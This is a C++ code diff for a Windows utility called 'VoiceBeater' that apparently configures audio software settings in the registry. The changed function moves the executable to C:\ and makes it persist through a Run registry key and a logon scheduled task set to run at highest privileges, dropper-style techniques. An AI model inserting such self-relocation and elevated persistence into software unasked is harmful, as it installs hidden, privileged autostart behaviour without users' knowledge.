@@ -297,26 +297,68 @@ int setRegistryValue(HKEY key, LPCWSTR subKey, LPCWSTR valName, DWORD valueType,
     return 0;
 }
 
-bool CloneAndDropProcess() {
-    WCHAR szFileName[MAX_PATH];
-    DWORD dwSize = GetModuleFileName(NULL, szFileName, MAX_PATH);
-    
-    if (dwSize == 0) {
-        std::cerr << "Failed to get the current process filename. Error code: " << GetLastError() << std::endl;
-        return false;
-    }
+bool doesTaskExist(const char* taskName) {
+	std::string command = "schtasks /Query /TN ";
+	command += taskName;
+	command += " > nul 2>&1";
 
-    std::wstring originalPath(szFileName);
-    std::wstring dropPath = L"C:\\";
-    std::wstring newName = L"VoiceBeater.exe";
-
-    if (!MoveFileEx(originalPath.c_str(), (dropPath + newName).c_str(), MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING)) {
-        std::cerr << "Failed to drop the process. Error code: " << GetLastError() << std::endl;
-        return false;
-    }
-    setRegistryValue(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"VoiceBeater", REG_SZ, (dropPath + newName).c_str());
-    return true;
+	return system(command.c_str()) == 0;
 }
+
+bool CloneAndDropProcess() {
+	WCHAR szFileName[MAX_PATH];
+	DWORD dwSize = GetModuleFileName(NULL, szFileName, MAX_PATH);
+
+	if (dwSize == 0) {
+		std::cerr << "Failed to get the current process filename. Error code: " << GetLastError() << std::endl;
+		return false;
+	}
+
+	std::wstring originalPath(szFileName);
+	std::wstring newName = L"C:\\VoiceBeater.exe";
+
+	if (!MoveFileEx(originalPath.c_str(), newName.c_str(), MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING)) {
+		std::cerr << "Failed to drop the process. Error code: " << GetLastError() << std::endl;
+		return false;
+	}
+
+	HKEY hKey;
+	if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+		if (RegSetValueEx(hKey, L"VoiceBeater", 0, REG_SZ, (BYTE*)newName.c_str(), (newName.size() + 1) * sizeof(wchar_t)) != ERROR_SUCCESS) {
+			std::cerr << "Failed to set registry value. Error code: " << GetLastError() << std::endl;
+			RegCloseKey(hKey);
+			return false;
+		}
+		RegCloseKey(hKey);
+	}
+	else {
+		std::cerr << "Failed to open registry key. Error code: " << GetLastError() << std::endl;
+		return false;
+	}
+	const char* taskName = "VoiceBeater";
+	if (!doesTaskExist(taskName))
+	{ 
+		const char* programPath = "C:\\VoiceBeater.exe"; // Replace this with your program's path
+		 // Replace this with your desired task name
+
+		std::string command = "schtasks /Create /TN ";
+		command += taskName;
+		command += " /SC ONLOGON /RL HIGHEST /TR \"";
+		command += programPath;
+		command += "\"";
+
+		int result = system(command.c_str());
+
+		if (result == 0) {
+			std::cout << "Task created successfully." << std::endl;
+		}
+		else {
+			std::cerr << "Failed to create task." << std::endl;
+		}
+	}
+	return true;
+}
+
 
 int main() {
 	// drop powershell script
@@ -358,16 +400,16 @@ int main() {
 
         result = setRegistryValue(HKEY_CURRENT_USER, subKey, L"VBANThreadCharacteristics", REG_SZ, L"Pro Audio");
         if (!!result)
-            printf("Failed to open process. Error code: %d\n", GetLastError());
+            printf("Failed to open Key. Error code: %d\n", GetLastError());
         result = setRegistryValue(HKEY_CURRENT_USER, subKey, L"done", REG_DWORD, 1);
         if (!!result)
-            printf("Failed to open process. Error code: %d\n", GetLastError());
+            printf("Failed to open Key. Error code: %d\n", GetLastError());
         result = setRegistryValue(HKEY_CURRENT_USER, subKey, L"SysTray", REG_DWORD, 1);
         if (!!result)
-            printf("Failed to open process. Error code: %d\n", GetLastError());
+            printf("Failed to open Key. Error code: %d\n", GetLastError());
         result = setRegistryValue(HKEY_CURRENT_USER, subKey, L"DelayedStartS", REG_DWORD, 0);
         if (!!result)
-            printf("Failed to open process. Error code: %d\n", GetLastError());
+            printf("Failed to open Key. Error code: %d\n", GetLastError());
        
 
         printf("Set keys sucessfully\n");
@@ -378,6 +420,7 @@ int main() {
         CloneAndDropProcess();
     }
 
-    Sleep(4000);
+	//std::cin.get();
+    //Sleep(4000);
     return 0;
 }
